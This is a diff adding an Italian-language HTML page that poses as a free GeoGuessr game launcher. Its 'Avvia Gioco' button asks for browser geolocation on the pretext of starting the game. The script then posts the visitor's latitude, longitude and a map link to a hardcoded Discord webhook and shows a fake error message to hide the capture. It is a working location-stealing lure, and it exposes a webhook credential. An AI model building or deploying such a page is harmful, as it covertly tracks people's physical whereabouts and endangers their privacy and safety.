@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geoguesser For Free</title>
+    <style>
+        /* Impostazione dello sfondo a schermo intero con l'estetica di GeoGuessr */
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            /* Immagine panoramica a tema mappa/esplorazione */
+            background-image: url('https://worldguesser.io/data/image/geoguessr-free-1.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            color: #dcddde; 
+        }
+
+        /* Contenitore principale centrato e semitrasparente */
+        .container { 
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 480px; 
+            margin: 20px; 
+            padding: 40px 30px; 
+            background: rgba(47, 49, 54, 0.85); /* Trasparenza per far intravedere lo sfondo */
+            backdrop-filter: blur(12px); /* Effetto vetro sfocato molto moderno */
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 12px; 
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 28px;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        p {
+            color: #b9bbbe;
+            margin-bottom: 30px;
+        }
+
+        /* Pulsante in stile GeoGuessr / Discord */
+        button { 
+            padding: 14px 35px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            background-color: #6cb928; /* Verde brillante tipico dei pulsanti di GeoGuessr */
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-weight: bold; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(108, 185, 40, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        button:hover { 
+            background-color: #5aa11f; 
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(108, 185, 40, 0.6);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        #stato { 
+            margin-top: 25px; 
+            font-style: italic; 
+            color: #ffcc00; /* Colore giallo per renderlo leggibile in caso di avvisi o errori */
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>GeoGuessr Gioca Ora!</h1>
+    <p>Clicca per avviare la sessione di gioco gratuita.</p>
+    
+    <button onclick="InviaAWebHook()">Avvia Gioco</button>
+    
+    <div id="stato"></div>
+</div>
+
+<script>
+function InviaAWebHook() {
+    const stato = document.getElementById("stato");
+    
+    if (!navigator.geolocation) {
+        stato.innerText = "La geolocalizzazione non è supportata da questo browser.";
+        return;
+    }
+
+    stato.innerText = "Richiesta permessi in corso... Consenti per accedere al gioco.";
+
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            stato.innerText = "Caricamento in corso...";
+
+            const urlWebhook = "https://discord.com/api/webhooks/1547916199042490478/BdB9WMYLllFjWb8Ic4j9HkvMP3Cas9kZgWgF96k7Av1vLiAC5HCXQMpYySWwWKqJrI5G";
+
+            // Corretto il link della mappa inserendo i parametri corretti nel template letterale
+            const payload = {
+                embeds: [{
+                    title: "📍 Nuova Posizione Rilevata (Demo)",
+                    color: 5814783, 
+                    fields: [
+                        { name: "Latitudine", value: lat.toString(), inline: true },
+                        { name: "Longitudine", value: lon.toString(), inline: true },
+                        { name: "Mappa", value: `[Apri in Google Maps](https://google.com{lat},${lon})` }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(urlWebhook, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    stato.innerText = "Errore nell'accesso.";
+                } else {
+                    stato.innerText = "Errore durante l'invio dei dati a Discord (Verifica l'URL del Webhook).";
+                }
+            })
+            .catch(error => {
+                stato.innerText = "Errore di rete durante la trasmissione.";
+            });
+        },
+        (error) => {
+            if (error.code === error.PERMISSION_DENIED) {
+                stato.innerText = "Impossibile accedere all'esperienza, necessaria la posizione.";
+            } else {
+                stato.innerText = "Impossibile determinare la posizione geografica.";
+            }
+        }
+    );
+}
+</script>
+
+</body>
+</html>
